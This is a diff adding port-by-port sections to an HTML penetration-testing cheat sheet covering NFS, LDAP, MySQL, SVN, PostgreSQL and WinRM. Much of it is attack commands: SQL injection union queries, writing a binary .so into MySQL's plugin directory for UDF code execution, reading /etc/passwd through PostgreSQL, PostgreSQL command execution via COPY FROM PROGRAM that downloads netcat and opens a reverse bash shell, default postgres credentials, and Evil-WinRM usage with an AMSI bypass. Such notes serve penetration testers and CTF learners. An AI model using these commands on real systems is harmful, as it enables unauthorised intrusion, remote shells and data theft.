@@ -1759,6 +1759,315 @@ end;
 </pre>
 </ul>
 
+<h2>2049 TCP / mountd (NFS)</h2>
+<li>sudo apt install nfs-common</li>
+<table>
+    <tr>
+        <td>Show paths that can be mounted and who can mount them</td>
+        <td>showmount -e &lt;ip address&gt;</td>
+    </tr>
+    <tr>
+        <td>Show client IP's using the mount</td>
+        <td>showmount -a &lt;ip address&gt;</td>
+    </tr>
+    <tr>
+        <td>mount an NFS path</td>
+        <td>mount -t nfs &lt;ip address&gt;:&lt;nfs share&gt;  &lt;local directory to mount to - Example: /mnt/&gt;</td>
+    </tr>
+</table>
+
+<h2>3000 TCP / Express.js Node</h2>
+<li>hadoop</li>
+<ul>
+    <li>Big data storage solution</li>
+    <li>Data analytics & Data science</li>
+</ul>
+
+<h2>3268 TCP / LDAP
+</h2>
+<li>LDAP connection to Global Catalog instead of the local DC which port 389 will return information for</li>
+<li>LDAP requests sent to port 3268 can be used to search for objects in the entire forest.</li>
+<li>Only the attributes marked for replication to the global catalog can be returned.</li>
+<br>
+<h2>3269 TCP / LDAPS</h2>
+<li>LDAP connection to Global Catalog over SSL.</li>
+
+<h2>3306 TCP / MySql</h2>
+<li>Connect to a mysql database</li>
+<ul>
+    <li>impacket-mssqlclient username:password@ip.address</li>
+    <li>mysql --host=127.0.0.1 --port=13306 --user=&lt;username&gt; -p&lt;password (no space after -p)&gt;</li>
+        <ul>
+            <li>Connect to local port (port forwarding in this example) 13306 as &lt;username&gt;</li>
+        </ul>
+</ul>
+
+<li>User-Defined Functions (UDF)</li>
+<ul>
+    <li>Similar to a custom plugin for mysql</li>
+    <li>Allows administrators to create custom repeatable functions to accomplish specific objectives</li>
+    <li>Written in C or C++ and will run almost any code including system commands</li>
+</ul>
+<table>
+    <tr>
+        <td>Show variables</td>
+        <td>
+            <li>show variables;</li>
+            <ul>
+                <li>Some possible interesting variabels</li>
+                <ul>
+                    <li>hostname</li>
+                    <li>tmp directory</li>
+                    <li>version</li>
+                    <li>Architecture</li>
+                    <li>plugin_dir</li>
+                </ul>
+            </ul>
+        </td>
+    </tr>
+    <tr>
+        <td>Show user privileges</td>
+        <td>SHOW grants;</td>
+    </tr>
+    <tr>
+        <td>Show individual variable</td>
+        <td>select @@&lt;variable &ndash; ex. plugin_dir&gt;;</td>
+    </tr>
+    <tr>
+        <td>Show plugins directory</td>
+        <td>show variables like '%plugin_dir%';</td>
+    </tr>
+    <tr>
+        <td>Show databases</td>
+        <td>use &lt;database name&gt;;</td>
+    </tr>
+    <tr>
+        <td>Show MariaDB version</td>
+        <td>@@version</td>
+    </tr>
+    <tr>
+        <td>Show the user being used to make queries</td>
+        <td>user()</td>
+    </tr>
+    <tr>
+        <td>Retrieve database information like table and column names.  A lot of information about default objects.</td>
+        <td>id=1 union all select #(1),of(2),columns(3), table_name from information_schema.tables</td>
+    </tr>
+    <tr>
+        <td>Output all columns from a specified table</td>
+        <td>column_name from information_schema.columns where table_name='TableName'</td>
+    </tr>
+    <tr>
+        <td>Select username and password columns from TableName</td>
+        <td>Select username, password from TableName</td>
+    </tr>
+    <tr>
+        <td>Show all columns and records in the users table</td>
+        <td>select * from users;</td>
+    </tr>
+    <tr>
+        <td>Show username field from the users table and only show records with an id of 1.</td>
+        <td>SELECT username FROM users WHERE id=1;</td>
+    </tr>
+    <tr>
+        <td>Load data from file into a table</td>
+        <td>LOAD DATA LOCAL INFILE '/var/www/html/index.php' INTO TABLE &lt;table name&gt; FIELDS TERMINATED BY "\n"</td>
+    </tr>
+    <tr>
+        <td>Change cell contents</td>
+        <td>UPDATE &lt;Table&gt; SET &lt;Column&gt;=&#039;&lt;Value&gt;&#039; WHERE &lt;Column&gt;=&#039;&lt;Value&gt;&#039;;</td>
+    </tr>
+    <tr>
+        <td>Create Database</td>
+        <td>Create Database &lt;Database Name&gt;;</td>
+    </tr>
+    <tr>
+        <td>Create user</td>
+        <td>create user &#039;&lt;username&gt;&#039;@&#039;&lt;host&gt;&#039; IDENTIFIED BY &#039;&lt;password?&gt;&#039;;</td>
+    </tr>
+    <tr>
+        <td>Give all permissions to user</td>
+        <td>GRANT ALL on &lt;database&gt;.* TO &#039;&lt;user&gt;&#039;@&#039;&lt;host&gt;&#039;;</td>
+    </tr>
+    <tr>
+        <td>String delimiter.  Can use to check for SQL injection vulnerabilities</td>
+        <td>'</td>
+    </tr>
+    <tr>
+        <td>Comment marker.  Removes the statement after it from the query.</td>
+        <td>#</td>
+    </tr>
+    <tr>
+        <td>Limit the number of records that a query pulls</td>
+        <td>LIMIT &lt;number&gt;</td>
+    </tr>
+    <tr>
+        <td>Set binary variable</td>
+        <td>set @&lt;variable name&gt; = 0x&lt;binary/hex code&gt;</td>
+    </tr>
+    <tr>
+        <td>Output binary variable to file</td>
+        <td>select binary @&lt;binary variable&gt; into dumpfile &#039;/home/directory/to/put/file/something.so&#039;;</td>
+    </tr>
+    <tr>
+        <td>Information about tables and databases</td>
+        <td>information_schema.tables</td>
+    </tr>
+</table>
+
+<h2>3389 TCP / RDP</h2>
+<br>
+
+<h2>3690 TCP / SVN</h2>
+<table>
+    <tr>
+        <td>list svn contents</td>
+        <td>svn list svn://&lt;ip address&gt;</td>
+    </tr>
+    <tr>
+        <td>create local copy of respository </td>
+        <td>svn checkout svn://&lt;ip address&gt;</td>
+    </tr>
+    <tr>
+        <td>Log history</td>
+        <td>svn log</td>
+    </tr>
+    <tr>
+        <td>View/walk revisions</td>
+        <td>svn up -&lt;revision from log&gt;</td>
+    </tr>
+</table>
+
+<h2>5432 TCP Postgresql</h2>
+<li>Default credentials are</li>
+<ul>
+    <li>Username: postgres</li>
+    <li>Password: postgres</li>
+    <ul>
+        <li>Sometimes no password?</li>
+    </ul>
+</ul>
+<li>Typical reverse shell privileges</li>
+<ul>
+    <li>NT AUTHORITY/NETWORK SERVICE (low priv)</li>
+    <li>Linux - postgres (low priv)</li>
+    <li>Mac - user that installed postgres (usually an admin)</li>
+</ul>
+<li>Tools</li>
+<ul>
+    <li>psql</li>
+    <table>
+        <tr>
+            <td>connect to databse</td>
+            <td>psql -h &lt;ip address&gt; -U &lt;username&gt;</td>
+        </tr>
+        <tr>
+            <td>List databases</td>
+            <td>\list</td>
+        </tr>
+        <tr>
+            <td>use databases</td>
+            <td>\c &lt;db&gt;</td>
+        </tr>
+        <tr>
+            <td>List tables</td>
+            <td>\d</td>
+        </tr>
+        <tr>
+            <td>Get user roles</td>
+            <td>\du+</td>
+        </tr>
+        <tr>
+            <td>Browse system files</td>
+            <td>select pg_ls_dir('./');<br>select pg_ls_dir('/etc/passwd');</td>
+        </tr>
+        <tr>
+            <td>Read files by copying contents to a table</td>
+            <td>
+                <table>
+                    <tr>
+                        <td>Create table</td>
+                        <td>create table docs (data TEXT);</td>
+                    </tr>
+                    <tr>
+                        <td>Copy contents to a table</td>
+                        <td>copy docs from '/etc/passwd';</td>
+                    </tr>
+                    <tr>
+                        <td>Display table contents</td>
+                        <td>select * from docs limit 10;</td>
+                    </tr>
+                </table>
+            </td>
+        </tr>
+    </table>
+</ul>
+<li>RCE</li>
+<table>
+    <tr>
+        <td>Drop table</td>
+        <td>DROP TABLE IF EXISTS cmd_exec;</td>
+    </tr>
+    <tr>
+        <td>Create table</td>
+        <td>CREATE TABLE cmd_exec(cmd_output text);</td>
+    </tr>
+    <tr>
+        <td>Setup command</td>
+        <td>COPY cmd_exec FROM PROGRAM 'id'<br>COPY cmd_exec FROM PROGRAM 'wget http://&lt;ip address&gt;/nc';<br>COPY cmd_exec FROM PROGRAM 'nc -n &lt;ip address&gt; &lt;rev shell port&gt; -e /usr/bin/bash';</td>
+    </tr>
+    <tr>
+        <td>Remove command</td>
+        <td>DELETE FROM cmd_exec;</td>
+    </tr>
+    <tr>
+        <td>Execute command</td>
+        <td>SELECT * FROM cmd_exec;</td>
+    </tr>
+</table>
+
+<h2>5985 TCP / Microsoft HTTPAPI</h2>
+<br>
+
+<h2>5985 TCP / WinRM</h2>
+<li>Windows remote management</li>
+<ul>
+    <li>Can log into a remote shell using user credentials</li>
+    <ul>
+        <li>Only users part of groups that have rights to this are allowed to login this way</li>
+    </ul>
+</ul>
+<li>Tools</li>
+<ul>
+    <li>Evil-WinRM</li>
+    <ul>
+        <li>https://github.com/Hackplayers/evil-winrm</li>
+    </ul>
+    <table>
+        <tr>
+            <td>Usage</td>
+            <td>evil-winrm -I &lt;ip address&gt; -u &lt;username&gt; -p &lt;password&gt;</td>
+        </tr>
+        <tr>
+            <td>Show menu</td>
+            <td>menu</td>
+        </tr>
+        <tr>
+            <td>Invoke-Binary</td>
+            <td>Invoke-Binary &lt;.exe on local machine&gt;</td>
+        </tr>
+        <tr>
+            <td>Bypass AMSI</td>
+            <td>Bypass-4MSI</td>
+        </tr>
+        <tr>
+            <td>Connect with SSL cert</td>
+            <td>evil-winrm -i &lt;ip address&gt; -u &lt;user&gt; -p &lt;password&gt; -k &lt;private key&gt; -c &lt;signed key/certificate&gt; -S</td>
+        </tr>
+    </table>
+</ul>
+
+
 
 </body>
 </html>
